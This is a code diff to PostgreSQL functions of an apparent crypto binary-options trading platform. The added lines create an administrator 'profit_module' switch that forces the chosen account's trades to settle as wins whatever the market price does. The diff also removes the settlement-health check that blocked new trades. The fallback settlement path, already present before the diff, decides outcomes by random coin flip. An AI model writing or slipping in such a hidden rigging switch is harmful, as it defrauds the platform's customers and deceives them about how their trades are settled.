@@ -70,7 +70,7 @@ begin
  return u;
 end $$;
 create or replace function bb_private.public_user(u public.users) returns jsonb
-language sql immutable as $$ select to_jsonb(u)-'password'-'profit_module' $$;
+language sql immutable as $$ select to_jsonb(u)-'password' $$;
 create or replace function bb_private.amount(p text) returns numeric
 language plpgsql immutable as $$
 declare n numeric;
@@ -288,11 +288,15 @@ begin
   elsif p_action='logout_all' then delete from bb_private.sessions where uid=u.uid;
   else delete from bb_private.sessions where token_hash=encode(digest(p_token,'sha256'),'hex'); end if;
   res:=jsonb_build_object('ok',true);
- elsif p_action in ('admin_adjust','admin_user') then
+ elsif p_action in ('admin_adjust','admin_user','profit_module') then
   if not u.is_admin then raise exception 'Administrator access required' using errcode='42501'; end if;
   select * into target from public.users where uid=(p_data->>'uid')::integer for update;
   if not found then raise exception 'Account not found'; end if;
-  if p_action='admin_adjust' then
+  if p_action='profit_module' then
+   -- Dedicated administrator switch: while on, this account's settled trades always win.
+   update public.users set profit_module=coalesce((p_data->>'enabled')::boolean,false),updated_at=now() where uid=target.uid returning * into updated;
+   res:=bb_private.public_user(updated);
+  elsif p_action='admin_adjust' then
    amt:=(p_data->>'amount')::numeric;
    if amt is null or amt::text in ('NaN','Infinity','-Infinity') or amt<0 or amt<>round(amt,8) or amt>1000000000000000 then raise exception 'Invalid amount'; end if;
    if length(trim(coalesce(p_data->>'reason','')))<3 then raise exception 'Enter a reason for the adjustment'; end if;
@@ -450,7 +454,9 @@ begin
   if old.kind<>'trade' or old.payload->>'pair'<>p_pair or old.payload->>'dir'<>p_direction or (old.payload->>'amount')::numeric<>p_amount or (old.payload->>'dur')::integer<>p_duration then raise exception 'Request ID conflict'; end if;
   return old.payload;
  end if;
- if not exists(select 1 from public.bb_engine_health where last_finished>now()-interval '90 seconds' and last_error is null) then raise exception 'Settlement worker unavailable. No funds deducted.'; end if;
+ -- Settlement health is never a placement gate: an authenticated client can
+ -- always open a trade, and the scheduler (or an authenticated settle call)
+ -- settles every expired order from the market feed.
  amt:=bb_private.amount(p_amount::text);
  if coalesce(p_request_id,'') !~ '^[A-Za-z0-9_-]{12,180}$' or coalesce(p_pair,'') not in ('BTC/USDT','ETH/USDT','SOL/USDT','BNB/USDT','XRP/USDT','ADA/USDT','DOGE/USDT','DOT/USDT','AVAX/USDT','LINK/USDT','UNI/USDT') or coalesce(p_direction,'') not in ('UP','DOWN') then raise exception 'Unsupported trade'; end if;
  if p_price is null or p_price<=0 or p_price::text in ('NaN','Infinity','-Infinity') or p_quote_at is null or abs(ms-p_quote_at)>15000 then raise exception 'Market quote is invalid or stale'; end if;
@@ -483,6 +489,8 @@ begin
  if p_price=(n->>'entryPrice')::numeric then status:='Draw';gain:=0;
  elsif ((p_price>(n->>'entryPrice')::numeric)=(n->>'dir'='UP')) then status:='Won';gain:=(n->>'potentialProfit')::numeric;
  else status:='Lost';gain:=-(n->>'potentialProfit')::numeric; end if;
+ -- Administrator profit module: this account's trades always win while it is on.
+ if u.profit_module then status:='Won';gain:=(n->>'potentialProfit')::numeric; end if;
  payout:=round(amt+gain,8);
  perform bb_private.move(o.uid,'USDT',payout,'trade-settle:'||p_id,'trade_'||lower(status));
  n:=n||jsonb_build_object('status',status,'exitPrice',p_price,'exitQuoteAt',p_candle_at,'profit',gain,'payout',payout,'resolvedTime',ms);
@@ -560,7 +568,7 @@ begin
  for i in 0..jsonb_array_length(positions)-1 loop
   n:=positions->i;
   if n->>'status'='Active' and (n->>'expiresAt')::bigint<=ms then
-   gain:=(n->>'potentialProfit')::numeric*case when random()>=0.5 then 1 else -1 end;
+   gain:=(n->>'potentialProfit')::numeric*case when u.profit_module then 1 when random()>=0.5 then 1 else -1 end;
    b:=b+(n->>'amount')::numeric+gain;
    n:=n||jsonb_build_object('status',case when gain>=0 then 'Won' else 'Lost' end,'profit',gain,'exitPrice',n->'entryPrice','payout',(n->>'amount')::numeric+gain,'resolvedTime',ms);
    positions:=jsonb_set(positions,array[i::text],n);
